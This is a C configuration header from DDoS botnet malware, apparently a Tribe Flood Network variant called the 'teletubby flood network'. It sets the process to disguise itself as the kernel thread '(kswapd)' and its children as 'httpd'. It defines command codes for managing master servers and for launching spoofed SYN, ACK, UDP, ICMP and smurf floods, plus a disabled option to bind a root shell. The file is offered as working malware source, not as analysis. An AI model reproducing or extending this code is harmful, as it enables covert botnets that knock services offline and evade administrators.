#ifndef _CONFIG_H

/* user defined values for the teletubby flood network */

#define HIDEME "(kswapd)"
#define HIDEKIDS "httpd"
#define CHILDS 10
#define SPECIAL_VERSION
/* These are like passwords, you might want to change them */

//#define ID_SHELL   1	/* to bind a rootshell */

#define ID_ADDR  699     /* ip add request for the flood server */

#define  ID_SETPRANGE 9007 /* set port range for synflood */
#define   ID_SETUSIZE 9006 /* set udp size */
#define   ID_SETISIZE 9005 /* set icmp size */
#define    ID_TIMESET 9004 /* set the flood time */
#define     ID_DIEREQ 9003 /* shutdown request of the masterserver */
#define   ID_DISTROIT 9002 /* distro request of the master server */
#define ID_REMMSERVER 9001 /* remove added masterserver */
#define ID_ADDMSERVER 9000 /* add new masterserver request */
#define SPOOF_REPLY 9000   /* spoof test reply of the master server */
#define ID_TEST  9668       /* test of the master server */
#define ID_ICMP  9055  	   /* to icmp flood */
#define ID_SENDUDP 9012	   /* to udp flood */
#define ID_SENDSYN 9013	   /* to syn flood */
#define ID_SENDACK 9113	   /* to syn flood */
#define ID_SENDNUL 9213	   /* to syn flood */
#define ID_SYNPORT 9014	   /* to set port */
#define ID_STOPIT  9015	   /* to stop flooding */
#define ID_SWITCH  9016	   /* to switch spoofing mode */
#define ID_ACK     9017	   /* for replies to the client */
#define ID_SENDSMURF 9028  /* mass smurf request */

#define _CONFIG_H
#endif
